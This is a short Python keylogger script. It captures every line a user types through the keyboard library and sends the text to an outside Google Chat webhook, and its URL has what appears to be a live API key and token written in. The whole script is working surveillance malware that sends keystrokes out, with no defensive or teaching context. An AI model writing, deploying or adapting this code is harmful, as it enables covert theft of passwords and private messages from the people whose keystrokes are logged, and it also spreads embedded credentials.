
from json import dumps
from httplib2 import Http
import threading, keyboard, json

def sendchat(text):
    url = 'https://chat.googleapis.com/v1/spaces/AAAAe-ewe8U/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=MFKB5wx7DcFau_KB__1OxghT_43rauWeaA8YkckCVos%3D'
    bot_message = {'text' : str(text)}
    
    message_headers = {'Content-Type': 'application/json; charset=UTF-8'}
    http_obj = Http()
    
    http_obj.request(
        uri=url,
        method='POST',
        headers=message_headers,
        body=dumps(bot_message))


while 1:
    keyboard.start_recording()
    keyboard.wait("\n")
    keyboard_events = keyboard.stop_recording()

    lst=[]
    x=0

    for i in keyboard_events:
        x+=1
        jd = json.loads(i.to_json())
        
        if jd['name'] == 'space':
            jd['name'] = ' '
            
        if len(jd['name']) == 1 and x%2:
    #         print(jd['name'])
            lst.append(jd['name'])
            
    sendchat(''.join(lst))
    print('log sent !')